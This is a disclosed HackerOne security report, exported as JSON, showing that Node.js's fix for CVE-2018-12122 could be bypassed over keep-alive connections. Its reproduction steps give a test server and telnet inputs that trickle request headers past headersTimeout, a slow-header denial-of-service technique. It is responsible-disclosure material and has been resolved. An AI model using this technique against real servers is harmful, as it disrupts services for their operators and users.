{
  "id": 453513,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NTM1MTM=",
  "url": "https://hackerone.com/reports/453513",
  "title": "Fix for CVE-2018-12122 can be bypassed via keep-alive requests",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-12-01T10:03:22.018Z",
  "submitted_at": "2018-12-01T10:03:22.018Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mpracucci",
    "url": "/mpracucci",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/423/250/91003a6c4f9278f33f3f9de12379857b8e417389_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-12122"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-02-13T23:57:13.092Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-01-14T23:57:12.703Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** Fix for CVE-2018-12122 can be bypassed via keep-alive requests\n\n**Description:**\n\nI'm not a security expert, neither I'm familiar with Node.js core, so please forgive me if this report is inaccurate (and in that case, sorry for your time).\n\nWhile investigating the issue [#515](https://github.com/nodejs/node/issues/24760)I checked out the fix to Fix for CVE-2018-12122 in node 8.14.0 and - according to my tests - the fix can be bypassed using a keep-alive connection.\n\nThe core of the fix is to introduce `headersTimeout`, which is a timeout that destroy the socket if all headers are not received within that timeout. As far as I can see from [this changeset](https://github.com/nodejs/node/commit/696f063c5e), the `parser.parsingHeadersStart` timestamp is set on `connectionListenerInternal()`, reset to zero once the full request headers are received (this is used as a short circuit in `onParserExecute()`) , but it's never set againt to a timestamp once a subsequent request on the same keep-alive connection is received.\n\n## Steps To Reproduce\n\n1. Run an HTTP server and lower `headersTimeout` to 10s for simplicity (faster to test)\n\n```\nconst http = require(\"http\");\n\nconst server = http.createServer((req, res) => {\n    res.writeHead(200);\n    res.end();\n});\n\nserver.headersTimeout   = 10000;\nserver.keepAliveTimeout = 60000;\n\nserver.listen(4050);\n```\n\n2. Connect with `telnet localhost 4050`\n\n3. Send the first request, typing...\n\n```\nGET / HTTP/1.1\nConnection: keep-alive\n\n```\n\n4. Then, once the server response is received, send only the first line of the subsequent request on the same connection:\n\n```\nGET / HTTP/1.1\n```\n\n5. Wait longer than the headersTimeout and send a second header\n\n```\nHost: localhost\n```\n\n6. Wait more time, if you want send further headers, and finally a newline to signal the end of the headers request. The server will **not** destroy the socket / close the connection after 10s (or whatever `headersTimeout` is set to), but will successfully reply.\n\n## Impact\n\nTo my understanding, it has the same impact of `CVE-2018-12122`, but I may also be terribly wrong.\n\n## Supporting Material/References:\n\nN/A\n\n## Impact\n\nIt may DoS a Node.js application.",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-02-13T23:57:12.795Z",
  "allow_singular_disclosure_after": -126191844.63419889,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "zude",
    "mechboy",
    "0xffcourse"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
